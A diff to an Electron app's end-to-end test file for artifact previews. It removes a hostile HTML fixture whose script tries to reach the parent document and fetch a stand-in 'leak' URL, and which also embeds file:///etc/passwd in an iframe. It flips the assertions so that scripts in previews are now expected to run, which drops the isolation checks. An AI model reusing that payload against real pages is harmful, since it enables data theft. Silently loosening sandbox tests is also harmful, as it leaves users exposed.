@@ -211,7 +211,9 @@ test("the diagram tool creates an editable Excalidraw artifact in desktop storag
       new TextEncoder().encode(JSON.stringify(updated)),
     );
     await page.getByText("A newer version arrived. Your edits are still here.").waitFor();
-    const database = new DatabaseSync(join(settingsDirectory, "artifacts/scope.db"));
+    const database = new DatabaseSync(join(settingsDirectory, "artifacts/scope.db"), {
+      timeout: 5000,
+    });
     try {
       database.exec(
         "CREATE TRIGGER fail_draft BEFORE INSERT ON tab_drafts BEGIN SELECT RAISE(ABORT, 'synthetic write failure'); END",
@@ -371,7 +373,7 @@ test("the diagram tool creates an editable Excalidraw artifact in desktop storag
   }
 }, 60_000);
 
-test("Electron receives and reopens artifacts, isolates hostile HTML, and keeps development keys out of files", async () => {
+test("Electron receives and reopens interactive HTML and keeps development keys out of files", async () => {
   const { directory, settingsDirectory, connectionFile, launch, connect, cli } =
     await desktopFixture();
   let application: Awaited<ReturnType<typeof launch>> | undefined;
@@ -404,26 +406,27 @@ test("Electron receives and reopens artifacts, isolates hostile HTML, and keeps 
     await page.keyboard.press("Escape");
     expect(await page.getByRole("heading", { name: "Actual report" }).isVisible()).toBe(true);
     await client.publish(
-      "hostile",
+      "prototype",
       {
-        title: "Hostile preview",
+        title: "Interactive preview",
         kind: "html",
         mediaType: "text/html",
-        fileName: "hostile.html",
+        fileName: "prototype.html",
         expectedRevision: 0,
       },
       new TextEncoder().encode(
-        `<h1>Isolated preview</h1><script>document.body.dataset.executed='yes';parent.document.body.dataset.compromised='yes';fetch('https://example.invalid/leak')</script><img src="https://example.invalid/pixel"><iframe src="file:///etc/passwd"></iframe><form action="https://example.invalid/submit"><button>Submit</button></form>`,
+        `<h1>Interactive preview</h1><button onclick="this.textContent='Clicked'">Try prototype</button><script>document.body.dataset.executed='yes'</script>`,
       ),
     );
     expect(await page.getByRole("heading", { name: "Actual report" }).isVisible()).toBe(true);
     await page.getByRole("button", { name: "Search and controls" }).click();
-    await page.getByLabel("Search artifacts", { exact: true }).fill("Hostile preview");
-    await page.getByRole("button", { name: "Hostile preview html" }).click();
-    const preview = page.frameLocator('iframe[title="Hostile preview"]');
-    await preview.getByRole("heading", { name: "Isolated preview" }).waitFor();
-    expect(await preview.locator("body").getAttribute("data-executed")).toBeNull();
-    expect(await page.locator("body").getAttribute("data-compromised")).toBeNull();
+    await page.getByLabel("Search artifacts", { exact: true }).fill("Interactive preview");
+    await page.getByRole("button", { name: "Interactive preview html" }).click();
+    const preview = page.frameLocator('iframe[title="Interactive preview"]');
+    await preview.getByRole("heading", { name: "Interactive preview" }).waitFor();
+    expect(await preview.locator("body").getAttribute("data-executed")).toBe("yes");
+    await preview.getByRole("button", { name: "Try prototype" }).click();
+    await preview.getByRole("button", { name: "Clicked", exact: true }).waitFor();
     const frame = page.frames().find((candidate) => candidate !== page.mainFrame())!;
     expect(
       await frame.evaluate(() => ({
@@ -439,7 +442,7 @@ test("Electron receives and reopens artifacts, isolates hostile HTML, and keeps 
           return false;
         }
       }),
-    ).toBe(false);
+    ).toBe(true);
     await page.getByRole("button", { name: "Search and controls" }).click();
     await page.getByRole("button", { name: "Settings", exact: true }).click();
     expect(await page.getByText("Hub connection", { exact: true }).count()).toBe(0);
@@ -475,7 +478,7 @@ test("Electron receives and reopens artifacts, isolates hostile HTML, and keeps 
     application = await launch();
     const restored = await connect();
     expect((await restored.list()).map((artifact) => artifact.id).sort()).toEqual([
-      "hostile",
+      "prototype",
       "review",
     ]);
     expect(JSON.parse((await cli("get", "review")).stdout)).toMatchObject({
@@ -484,8 +487,16 @@ test("Electron receives and reopens artifacts, isolates hostile HTML, and keeps 
     });
     const reopened = await application.firstWindow();
     await reopened
-      .frameLocator('iframe[title="Hostile preview"]')
-      .getByRole("heading", { name: "Isolated preview" })
+      .frameLocator('iframe[title="Interactive preview"]')
+      .getByRole("heading", { name: "Interactive preview" })
+      .waitFor();
+    await reopened
+      .frameLocator('iframe[title="Interactive preview"]')
+      .getByRole("button", { name: "Try prototype" })
+      .click();
+    await reopened
+      .frameLocator('iframe[title="Interactive preview"]')
+      .getByRole("button", { name: "Clicked", exact: true })
       .waitFor();
     expect(await reopened.getByRole("button", { name: "Close Review", exact: true }).count()).toBe(
       1,
